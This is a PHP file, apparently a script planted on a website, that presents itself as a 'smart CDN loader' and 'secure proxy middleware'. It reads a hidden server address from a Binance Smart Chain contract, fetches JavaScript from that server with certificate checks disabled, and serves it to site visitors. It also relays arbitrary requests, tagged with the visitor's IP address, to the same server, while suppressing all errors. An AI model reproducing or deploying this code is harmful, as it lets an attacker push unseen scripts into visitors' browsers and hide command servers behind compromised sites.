<?php
error_reporting(0);
ini_set('display_errors', 0);
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: *');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Max-Age: 3600');

$CURRENT_PATH = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

function getCurrentUrl() {
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $path = strtok($_SERVER['REQUEST_URI'], '?');
    return $protocol . '://' . $host . $path;
}

$permitKey = '34v52wewxwgz27cn7h9a';
$loaderParam = isset($_GET['m']) ? $_GET['m'] : null;
$noCache = false;

function getClientIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

class SmartCDNLoader {
    private $permitKey;
    private $cdnUrl;
    private $cacheDir;
    private $updateInterval = 300;
    private $noCache;

    public function __construct($permitKey, $cdnUrl = 'http://localhost:3000', $noCache = false) {
        $this->permitKey = $permitKey;
        $this->cdnUrl = rtrim($cdnUrl, '/');
        $this->noCache = $noCache;

        $serverIdentifier = md5($_SERVER['SERVER_NAME'] . ':' . $_SERVER['HTTP_HOST'] ?? 'default_host_id');
        $this->cacheDir = sys_get_temp_dir() . '/.smartcdn_cache_' . $serverIdentifier;

        if (!is_dir($this->cacheDir)) {
            mkdir($this->cacheDir, 0755, true);
        }
    }

    private function calculateFileHash($filePath) {
        if (!file_exists($filePath)) {
            return false;
        }
        return hash_file('sha256', $filePath);
    }

    private function getRemoteFilesConfig() {
        $url = $this->cdnUrl . '/jscdn/getFilesConfig';
        $payload = json_encode(['permit_key' => $this->permitKey]);

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTPHEADER => [
                'Accept: application/json',
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload)
            ]
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 200 && $response) {
            $data = json_decode($response, true);
            if ($data && isset($data['fileHash']) && isset($data['loaderHash'])) {
                return $data;
            }
        }

        return false;
    }

    private function downloadFile() {
        $url = $this->cdnUrl . '/jscdn/getFile';
        $payload = json_encode(['permit_key' => $this->permitKey]);

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTPHEADER => [
                'Accept: application/javascript',
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload)
            ]
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 200 && $response) {
            return $response;
        }

        return false;
    }

    private function downloadLoader() {
        $url = $this->cdnUrl . '/jscdn/getLoader';
        $payload = json_encode(['permit_key' => $this->permitKey]);

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTPHEADER => [
                'Accept: application/javascript',
                'Content-Type: application/json',
                'Content-Length: ' . strlen($payload)
            ]
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 200 && $response) {
            return $response;
        }

        return false;
    }

    private function updateCacheIfNeeded($type = 'loader') {
        if ($this->noCache) {
            $newContent = ($type === 'loader') ? $this->downloadLoader() : $this->downloadFile();
            return $newContent !== false ? $newContent : false;
        }

        $isLoader = ($type === 'loader');

        $jsFile = $isLoader
            ? $this->cacheDir . '/.loader.js'
            : $this->cacheDir . '/.loader_' . md5($this->permitKey) . '.js';
        $metaFile = $isLoader
            ? $this->cacheDir . '/.loader.meta'
            : $this->cacheDir . '/.loader_' . md5($this->permitKey) . '.meta';

        $needsUpdate = false;
        $localHash = '';
        $cacheTTL = $this->updateInterval;

        if (!file_exists($jsFile)) {
            $needsUpdate = true;
        } else {
            $lastCheck = 0;
            if (file_exists($metaFile)) {
                $meta = json_decode(file_get_contents($metaFile), true);
                $lastCheck = $meta['last_check'] ?? 0;
                $cacheTTL = $meta['cache_ttl'] ?? $this->updateInterval;
            }

            if ((time() - $lastCheck) < $cacheTTL) {
                return file_get_contents($jsFile);
            }

            $filesConfig = $this->getRemoteFilesConfig();
            if ($filesConfig === false) {
                return file_get_contents($jsFile);
            }

            $cacheTTL = $filesConfig['cacheTTL'] ?? $this->updateInterval;
            $this->updateInterval = $cacheTTL;

            $localHash = $this->calculateFileHash($jsFile);

            $remoteHash = $isLoader ? $filesConfig['loaderHash'] : $filesConfig['fileHash'];

            if ($localHash !== $remoteHash) {
                $needsUpdate = true;
            }
        }

        if ($needsUpdate) {
            $newContent = $isLoader ? $this->downloadLoader() : $this->downloadFile();
            if ($newContent !== false) {
                file_put_contents($jsFile, $newContent);
                $newHash = $this->calculateFileHash($jsFile);

                $meta = [
                    'last_check' => time(),
                    'hash' => $newHash,
                    'size' => filesize($jsFile),
                    'cache_ttl' => $cacheTTL
                ];
                file_put_contents($metaFile, json_encode($meta));

                return $newContent;
            } else {
                if (file_exists($jsFile)) {
                    return file_get_contents($jsFile);
                } else {
                    return false;
                }
            }
        } else {
            $meta = [
                'last_check' => time(),
                'hash' => $localHash,
                'size' => filesize($jsFile),
                'cache_ttl' => $cacheTTL
            ];
            file_put_contents($metaFile, json_encode($meta));

            return file_get_contents($jsFile);
        }
    }

    public function generateLoader() {
        $content = $this->updateCacheIfNeeded('loader');

        if ($content === false) {
            http_response_code(503);
            return;
        }

        $currentUrl = getCurrentUrl();
        $currentUrl = str_replace('http://', 'https://', $currentUrl);
        $urlInjection = "window.e46jvfbmmj=\"" . addslashes($currentUrl) . "\";";
        $content = $urlInjection . $content;

        header('Content-Type: application/javascript');
        header('Cache-Control: public, max-age=3600');
        echo $content;
    }

    public function serveLoader() {
        $content = $this->updateCacheIfNeeded('file');

        if ($content === false) {
            http_response_code(503);
            return;
        }

        header('Content-Type: application/javascript');
        header('Cache-Control: public, max-age=300');
        echo $content;
    }
}

class SecureProxyMiddleware {
    private $updateInterval = 60;
    private $rpcUrls;
    private $contractAddress;
    private $cacheFile;

    public function __construct($options = []) {
        $this->rpcUrls = $options['rpcUrls'] ?? [
            "https://binance.llamarpc.com",
            "https://bsc.blockrazor.xyz",
            "https://bsc.therpc.io",
            "https://bsc-dataseed2.bnbchain.org"
        ];
        $this->contractAddress = $options['contractAddress'] ?? "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";

        $serverIdentifier = md5(
            $_SERVER['SERVER_NAME'] . ':' .
            $_SERVER['HTTP_HOST'] ?? 'default_host_id' . ':' .
            $_SERVER['SERVER_SOFTWARE']
        );
        $this->cacheFile = sys_get_temp_dir() . '/.proxy_cache_' . $serverIdentifier . '.json';
    }

    private function loadCache() {
        if (!file_exists($this->cacheFile)) return null;
        $cache = json_decode(file_get_contents($this->cacheFile), true);
        if (!$cache || (time() - $cache['timestamp']) > $this->updateInterval) {
            return null;
        }
        return $cache['domain'];
    }

    private function filterHeaders($headers) {
        $blacklist = ['host'];
        $formatted = [];

        foreach ($headers as $key => $value) {
            $key = strtolower($key);
            if (!in_array($key, $blacklist)) {
                $formatted[] = "$key: $value";
            }
        }

        return $formatted;
    }

    private function saveCache($domain) {
        $cache = ['domain' => $domain, 'timestamp' => time()];
        file_put_contents($this->cacheFile, json_encode($cache));
    }

    private function hexToString($hex) {
        $hex = preg_replace('/^0x/', '', $hex);
        $hex = substr($hex, 64);
        $lengthHex = substr($hex, 0, 64);
        $length = hexdec($lengthHex);
        $dataHex = substr($hex, 64, $length * 2);
        $result = '';
        for ($i = 0; $i < strlen($dataHex); $i += 2) {
            $charCode = hexdec(substr($dataHex, $i, 2));
            if ($charCode === 0) break;
            $result .= chr($charCode);
        }
        return $result;
    }

    private function fetchTargetDomain() {
        $data = '20965255';

        foreach ($this->rpcUrls as $rpcUrl) {
            try {
                $ch = curl_init($rpcUrl);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode([
                        'jsonrpc' => '2.0',
                        'id' => 1,
                        'method' => 'eth_call',
                        'params' => [[
                            'to' => $this->contractAddress,
                            'data' => '0x' . $data
                        ], 'latest']
                    ]),
                    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                    CURLOPT_TIMEOUT => 120,
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false
                ]);

                $response = curl_exec($ch);
                if (curl_errno($ch)) {
                    curl_close($ch);
                    continue;
                }

                curl_close($ch);
                $responseData = json_decode($response, true);
                if (isset($responseData['error'])) continue;

                $domain = $this->hexToString($responseData['result']);
                if ($domain) return $domain;
            } catch (Exception $e) {
                continue;
            }
        }
        throw new Exception('Could not fetch target domain');
    }

    public function getTargetDomain() {
        $cachedDomain = $this->loadCache();
        if ($cachedDomain) return $cachedDomain;

        $domain = $this->fetchTargetDomain();
        $this->saveCache($domain);
        return $domain;
    }

    private function formatHeaders($headers) {
        $formatted = [];
        foreach ($headers as $name => $value) {
            if (is_array($value)) $value = implode(', ', $value);
            $formatted[] = "$name: $value";
        }
        return $formatted;
    }

    public function handle($endpoint) {
        try {
            $targetDomain = rtrim($this->getTargetDomain(), '/');
            $endpoint = '/' . ltrim($endpoint, '/');
            $url = $targetDomain . $endpoint;

            $clientIP = getClientIP();

            $headers = getallheaders();
            unset($headers['Host'], $headers['host']);
            unset($headers['origin'], $headers['Origin']);
            unset($headers['Accept-Encoding'], $headers['Content-Encoding']);
            unset($headers['Content-Encoding'], $headers['content-encoding']);

            $headers['x-dfkjldifjlifjd'] = $clientIP;
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_CUSTOMREQUEST => $_SERVER['REQUEST_METHOD'],
                CURLOPT_POSTFIELDS => file_get_contents('php://input'),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HTTPHEADER => $this->formatHeaders($headers),
                CURLOPT_TIMEOUT => 120,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_ENCODING => ''
            ]);

            $response = curl_exec($ch);
            if (curl_errno($ch)) {
                throw new Exception(curl_error($ch));
            }

            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
            curl_close($ch);

            header('Access-Control-Allow-Origin: *');
            header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
            header('Access-Control-Allow-Headers: *');
            if ($contentType) header('Content-Type: ' . $contentType);

            http_response_code($httpCode);
            echo $response;

        } catch (Exception $e) {
            http_response_code(500);
        }
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, HEAD, POST, OPTIONS');
    header('Access-Control-Allow-Headers: *');
    header('Access-Control-Max-Age: 86400');
    http_response_code(204);
    exit;
}

if (!isset($_GET['e']) && $loaderParam === null) {
    $proxy = new SecureProxyMiddleware();
    $cdnUrl = $proxy->getTargetDomain();

    $loader = new SmartCDNLoader($permitKey, $cdnUrl, $noCache);
    $loader->generateLoader();
    exit;
} elseif ($loaderParam !== null) {
    $proxy = new SecureProxyMiddleware();
    $cdnUrl = $proxy->getTargetDomain();

    $loader = new SmartCDNLoader($permitKey, $cdnUrl, $noCache);
    $loader->serveLoader();
    exit;
}

if ($_GET['e'] === 'ping_proxy') {
    header('Content-Type: text/plain');
    echo 'pong';
    exit;
} else if (isset($_GET['e'])) {
    $proxy = new SecureProxyMiddleware([
        'rpcUrls' => [
            "https://binance.llamarpc.com",
            "https://bsc.blockrazor.xyz",
            "https://bsc.therpc.io",
            "https://bsc-dataseed2.bnbchain.org"
        ],
        'contractAddress' => "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0"
    ]);
    $endpoint = urldecode($_GET['e']);
    $endpoint = ltrim($endpoint, '/');

    $proxy->handle($endpoint);
}
